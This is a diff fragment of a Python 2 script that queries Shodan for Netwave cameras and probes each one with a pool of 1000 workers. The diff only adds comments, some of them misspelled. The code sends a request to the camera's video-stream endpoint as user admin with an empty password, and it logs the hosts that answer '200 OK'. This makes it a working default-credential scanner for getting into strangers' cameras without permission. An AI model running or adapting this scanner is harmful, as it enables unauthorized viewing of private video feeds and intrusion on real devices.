@@ -22,13 +22,13 @@ SHODAN_API_KEY = 'get out of it'
 filter = 'netwave camera'
 pool = Pool(1000)
 
-def checkCam(ip, port):
+def checkCam(ip, port): # Defines checCam function (ip port strings)
 	try:
-		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creates INET Steamsocket
 		sock.settimeout(5)
-		print 'Connecting to %s on port %s' % (ip, port)
+		print 'Connecting to %s on port %s' % (ip, port) # %s = % (strings)
 		sock.connect((ip, port))
-		sock.send('GET /videostream.cgi?user=admin&pwd= HTTP/1.0\r\n\r\n')
+		sock.send('GET /videostream.cgi?user=admin&pwd= HTTP/1.0\r\n\r\n') # \r\n carridge ret
 		res = sock.recv(100)
 		if(res.find('200 OK') > 0):
 			hoststring = str(ip) + ":" + str(port)
